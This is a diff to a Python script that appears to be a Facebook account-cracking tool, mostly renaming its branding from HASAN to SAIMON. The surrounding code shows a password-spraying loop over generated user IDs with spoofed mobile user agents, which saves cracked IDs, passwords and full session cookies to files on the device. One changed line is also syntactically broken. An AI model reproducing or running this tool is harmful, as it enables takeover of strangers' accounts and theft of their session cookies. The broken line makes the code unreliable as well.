@@ -182,7 +182,7 @@ ugen2=[]
 ugen=[]
 
 for xd in range(10000):
-    a='Mozilla/5.0 (Linux; Android 12; U668AA Build/SP1A.210812.016; wv)'
+    a'Mozilla/5.0 (Linux; Android 10; SM-M013F)'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
     c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -230,7 +230,7 @@ def i():
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print(' CRACK PROCESS HAS BEEN COMPLETED ')
-    print('IDS SAVED IN HASAN.txt, HASAN.txt')
+    print('IDS SAVED IN SAIMON.txt, SAIMON.txt')
  
 def rcrack(uid,pwx,tl):
     #print(user)
@@ -278,22 +278,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\033[1;32mHASAN-OK ] '+cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \033[0;32mUSER-AGENT : \033[0;90m'+pro+'  \033[0;90m')
+                print('\033[1;32mSAIMON-OK ] '+cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \033[0;32mUSER-AGENT : \033[0;90m'+pro+'  \033[0;90m')
                 cek_apk(session,coki)
-                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/SAIMON-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\33[1;34mHASAN-CP ] '+cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/HASAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('\33[1;34mSAIMON-CP ] '+cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/SAIMON-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r%s[HASAN] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r%s[SAIMON] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
